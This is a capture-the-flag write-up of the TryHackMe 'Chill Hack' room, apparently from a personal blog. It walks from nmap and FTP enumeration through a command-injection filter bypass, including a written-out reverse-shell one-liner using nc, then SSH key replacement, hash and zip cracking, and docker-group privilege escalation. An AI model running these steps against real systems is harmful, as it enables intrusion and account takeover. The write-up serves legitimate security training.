---
title: "Chill Hack - TryHackMe"
date: "2020-12-28"
categories: 
  - "tryhackme"
coverImage: "897a124df0a70ad86502193b83f46658.png"
---

write-up or Tryhackme room [chill hack](https://tryhackme.com/room/chillhack)

Difficulty Level - Easy

Start with Nmap Scan

```
nmap -A -oN initial 10.10.144.59
```

![](/Images/chillhack/Screenshot-2020-12-25-224609.png)

we can see FTP anonymous login available, log into FTP and get the files available then as usual run gobuster on websile

![](/Images/chillhack/Screenshot-2020-12-25-224532.png)

We can find directory name "**/secret**" when we go to that end point it let us run command in it, but some commands are filtered, we need to bypass filter.

you can find the methods to bypass filter in [here.](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

after you find the method you can easily get reverse shell, i used this bypass and comand to get shell.

```
"r"m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

after we got shell we need to move to more stable shell, type below command accocding to list

- python3 -c 'import pty; pty.spawn("/bin/bash")'
- export TERM=xterm
- "CTRL + Z" it will suspend (don't worry)
- stty raw -echo; fg

Now we have more stable shell. once we get first thing to do is checking all available file for any configured information or clues.

![](/Images/chillhack/Screenshot-2020-12-25-225508.png)

when we go through all documents we find above db detail. but can't do anything with this detail because we login as "**www-data**" we need to switch to better user.

we can find "**.helpline.sh**" in apaar home folder which is not requred apaar password.

![](/Images/chillhack/Screenshot-2020-12-25-230355.png)

Now we have shell as apaar, can we log in to mysql db and see anymore available details.there is Database name webportal can get some details from it.

![](/Images/chillhack/Screenshot-2020-12-25-230814.png)

now we have 2 user name and 2 hashes,

when we scan VM machine with **linpeas.sh** we notice port 9001 is available and it is liked to some webpage, when we go through files we notice there was ssh public key. we can create ssh key in our local machine, upload public key and replace with apaar public key.

![](/Images/chillhack/Screenshot-2020-12-29-005602.png)

now we can login as apaar and make webportal available also,

```
SSH -L 9001:127.0.0.1:9001 -i id_rsa appar@10.10.144.59
```

we had 2 username and 2 hashes from previous enumeration now try it and login to webportal

when we log in we see image and some text, download the image and try different method to see possible to get something out of it, eventually we can use tool **Steghide** and extract a ZIP file

![](/Images/chillhack/Screenshot-2020-12-25-232734.png)

we cannot open the zip file it password protected we need to crack the password with john, first convert it using "zip2john"

```
$ zip2john backup.zip > hash

$ john --wordlist=/opt/rockyou.txt hash
```

after we crack the hash unzip the **"backup.zip**" in source\_code.php we can find the another password. which is base64 encoded you can easily decode

```
echo "ENCODED PASSWORD" | base64 -d
```

![](/Images/chillhack/Screenshot-2020-12-25-233618.png)

## Privileged Escalation

Switch user and login as anurodh, when check the user id we can see he is part of docker, go to [GTFO](https://gtfobins.github.io/gtfobins/docker/#sudo) you can escalation method.

![](/Images/chillhack/Screenshot-2020-12-25-234003.png)

Happy Hacking!!
